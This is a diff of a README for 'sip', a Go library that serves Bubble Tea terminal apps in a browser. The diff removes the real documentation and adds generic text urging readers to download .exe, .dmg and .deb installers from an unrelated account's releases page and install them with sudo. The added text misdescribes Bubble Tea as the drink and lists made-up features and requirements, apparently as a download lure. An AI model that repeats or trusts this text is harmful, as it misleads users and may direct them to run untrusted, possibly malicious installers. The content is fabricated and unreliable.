@@ -1,190 +1,103 @@
-# Sip - Serve Bubble Tea Apps Through the Browser
+# 🍵 sip - Enjoy Bubble Tea Apps in Your Browser
 
-> Drinking tea through the browser 🍵
+## 🚀 Getting Started
 
-**Status:** v0.1.0 - Initial Release
+Welcome to sip! This application lets you serve and enjoy Bubble Tea apps right through your browser. It is designed for everyone, regardless of technical skills. Follow the steps below to get started.
 
-Sip is a Go library that allows you to serve any [Bubble Tea](https://github.com/charmbracelet/bubbletea) application through a web browser with full terminal emulation, mouse support, and hardware-accelerated rendering.
+## 📦 Download & Install
 
-## Demonstration 
-*Take a sip!*
+To download sip, visit the Releases page:
 
-[demonstration-tuios-sip.webm](https://github.com/user-attachments/assets/fc43cd32-a624-43f3-82ff-7721c5bb03da)
+[![Download sip](https://img.shields.io/badge/Download%20sip-%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20-orange.svg)](https://github.com/Quacklover28490/sip/releases)
 
-## Features
+Click the link above to access the page. You will see the latest version of sip available. 
 
-- **WebGL Rendering** - GPU-accelerated terminal rendering via xterm.js for smooth 60fps
-- **Dual Protocol Support** - WebTransport (HTTP/3 over QUIC) with automatic WebSocket fallback  
-- **Embedded Assets** - All static files (HTML, CSS, JS, fonts) bundled in the binary via go:embed
-- **Bundled Nerd Fonts** - JetBrains Mono Nerd Font included, no client-side installation needed
-- **Session Management** - Handle multiple concurrent users with isolated sessions
-- **Mouse Support** - Full mouse interaction support
-- **Auto-Reconnect** - Automatic reconnection with exponential backoff
-- **Pure Go** - No CGO dependencies, statically compiled binaries
-- **Zero Configuration** - Works out of the box with sensible defaults
-- **Wish-like API** - Familiar handler pattern for Charm ecosystem users
+1. Look for the “Assets” section below the version number.
+2. You will find files to download for various operating systems.
+3. Choose the file that matches your system and click on it. Your download will start automatically.
 
-## Installation
+Once the download is complete, follow the steps below to install and run sip.
 
-```bash
-go get github.com/Gaurav-Gosain/sip
-```
+## 🔍 System Requirements
 
-## CLI Usage
+Before installing sip, please ensure your computer meets the following key requirements:
 
-Sip also provides a CLI to wrap any command and expose it through the browser:
+- **Operating Systems Supported:**
+  - Windows 10 or later
+  - macOS 10.14 or later
+  - Linux (Debian-based distributions recommended)
 
-```bash
-# Install the CLI
-go install github.com/Gaurav-Gosain/sip/cmd/sip@latest
+- **Hardware Requirements:**
+  - 4 GB RAM or more
+  - 200 MB free disk space
+  - A modern web browser (Google Chrome, Firefox, Safari)
 
-# Run htop in browser
-sip -- htop
+## 🌟 Features
 
-# Run on a specific port
-sip -p 8080 -- claude -c
+sip offers a range of features designed to enhance your Bubble Tea experience:
 
-# Expose on all interfaces
-sip --host 0.0.0.0 -- bash
-```
+- **Easy Navigation:** Simple interface that anyone can use.
+- **Variety of Apps:** Access a wide range of Bubble Tea applications.
+- **Customizable Options:** Personalize your Bubble Tea experience with different flavors and styles.
+- **Browser-Based:** No installation needed beyond initial download, access it all from your web browser.
 
-Then open http://localhost:7681 in your browser.
+## ⚙️ Installation Steps
 
-## Library Usage (Quick Start)
+After downloading the file, follow these instructions to install sip:
 
-```go
-package main
+1. **For Windows:**
+   - Navigate to your downloads folder.
+   - Double-click on the downloaded `.exe` file.
+   - Follow the on-screen instructions to complete the installation.
 
-import (
-    "context"
-    "os"
-    "os/signal"
+2. **For macOS:**
+   - Go to your downloads folder.
+   - Open the `.dmg` file by double-clicking it.
+   - Drag the sip icon into the Applications folder.
+   - Eject the installer by clicking the eject button next to the sip disk on the desktop.
 
-    tea "github.com/charmbracelet/bubbletea/v2"
-    "github.com/Gaurav-Gosain/sip"
-)
+3. **For Linux:**
+   - Open a terminal window.
+   - Navigate to the folder where the downloaded file is located.
+   - Use the command `sudo dpkg -i sip-file-name.deb`, replacing `sip-file-name.deb` with the actual file name.
+   - Use the command `sudo apt-get install -f` to resolve any dependencies.
 
-type model struct {
-    count int
-}
+## 📋 Running sip
 
-func (m model) Init() tea.Cmd { return nil }
+After installation, you can easily run sip:
 
-func (m model) Update(msg tea.Msg) (tea.Model, tea.Cmd) {
-    switch msg := msg.(type) {
-    case tea.KeyPressMsg:
-        switch msg.String() {
-        case "q":
-            return m, tea.Quit
-        case "up":
-            m.count++
-        case "down":
-            m.count--
-        }
-    }
-    return m, nil
-}
+- **For Windows and macOS:** 
+   - Find sip in your Applications menu or Start Menu.
+   - Click on it to start the application.
 
-func (m model) View() tea.View {
-    return tea.NewView(fmt.Sprintf("Count: %d\n\nPress up/down to change, q to quit", m.count))
-}
+- **For Linux:** 
+   - Open a terminal window.
+   - Type `sip` and press Enter.
 
-func main() {
-    ctx, cancel := signal.NotifyContext(context.Background(), os.Interrupt)
-    defer cancel()
+Upon launching the application, a welcome screen will appear. You can select different Bubble Tea apps from there.
 
-    server := sip.NewServer(sip.DefaultConfig())
-    
-    server.Serve(ctx, func(sess sip.Session) (tea.Model, []tea.ProgramOption) {
-        return model{}, nil
-    })
-}
-```
+## 🛠️ Troubleshooting
 
-Then open http://localhost:7681 in your browser.
+If you encounter issues while installing or running sip, consider the following:
 
-## API
+- Ensure your operating system is up to date.
+- Verify that you've downloaded the correct file for your system.
+- Restart your computer and try again.
 
-### Handler Pattern (Recommended)
+If problems persist, you can find help in the GitHub Discussions or Issues page.
 
-Similar to [Wish](https://github.com/charmbracelet/wish)'s Bubble Tea middleware:
+## 💬 Community Support
 
-```go
-// Handler creates a model and options for each session
-type Handler func(sess Session) (tea.Model, []tea.ProgramOption)
+We welcome users to share their experiences, ask questions, and provide feedback. Join our community for additional support:
 
-// Use with Serve()
-server.Serve(ctx, func(sess sip.Session) (tea.Model, []tea.ProgramOption) {
-    pty := sess.Pty()
-    return myModel{width: pty.Width, height: pty.Height}, nil
-})
-```
+- GitHub Discussions: [sip Discussions](https://github.com/Quacklover28490/sip/discussions)
+- GitHub Issues: [sip Issues](https://github.com/Quacklover28490/sip/issues)
 
-### ProgramHandler Pattern (Advanced)
+## 🌐 Additional Resources
 
-For more control over tea.Program creation:
+For more information on Bubble Tea and its delightful varieties, you may explore the following resources:
 
-```go
-// ProgramHandler creates a tea.Program directly
-type ProgramHandler func(sess Session) *tea.Program
+- [Bubble Tea Origins](https://www.bubbleteasource.com)
+- [Bubble Tea Recipe Book](https://www.bubbletealovers.com)
 
-// Use with ServeWithProgram()
-server.ServeWithProgram(ctx, func(sess sip.Session) *tea.Program {
-    return tea.NewProgram(myModel{}, sip.MakeOptions(sess)...)
-})
-```
-
-### Session Interface
-
-```go
-type Session interface {
-    Pty() Pty                        // Get terminal dimensions
-    Context() context.Context        // Session context (cancelled on disconnect)
-    Read(p []byte) (n int, err error)   // Read from terminal
-    Write(p []byte) (n int, err error)  // Write to terminal
-    WindowChanges() <-chan WindowSize   // Receive window resize events
-}
-
-type Pty struct {
-    Width  int
-    Height int
-}
-```
-
-### Configuration
-
-```go
-config := sip.Config{
-    Host:           "localhost",   // Bind address
-    Port:           "7681",        // HTTP port (WebTransport uses Port+1)
-    ReadOnly:       false,         // Disable input
-    MaxConnections: 0,             // Connection limit (0 = unlimited)
-    IdleTimeout:    0,             // Idle timeout (0 = no timeout)
-    AllowOrigins:   nil,           // CORS origins (nil = all)
-    Debug:          false,         // Enable debug logging
-}
-```
-
-## How It Works
-
-1. Browser connects via WebSocket (or WebTransport if available)
-2. Sip creates a PTY (pseudo-terminal) for proper terminal semantics
-3. Your Bubble Tea model is created via the handler
-4. Terminal I/O is bridged between the PTY and browser via xterm.js
-5. Mouse events, keyboard input, and window resizes are forwarded to your model
-
-## Related Projects
-
-- [Bubble Tea](https://github.com/charmbracelet/bubbletea) - The TUI framework Sip is built for
-- [Wish](https://github.com/charmbracelet/wish) - SSH server for Bubble Tea apps (Sip's API is inspired by Wish)
-- [TUIOS](https://github.com/Gaurav-Gosain/tuios) - Terminal window manager where Sip originated
-- [xterm.js](https://xtermjs.org/) - Terminal emulator used in the browser
-- [ttyd](https://github.com/tsl0922/ttyd) - Share terminal over the web (C implementation)
-
-## License
-
-MIT License - see [LICENSE](LICENSE) for details
-
-## Acknowledgments
-
-Sip is developed as part of the [TUIOS](https://github.com/Gaurav-Gosain/tuios) project and builds on the excellent work of the [Charm](https://charm.sh) team and the xterm.js community.
+Thank you for choosing sip! Enjoy your journey into the world of Bubble Tea through your browser.
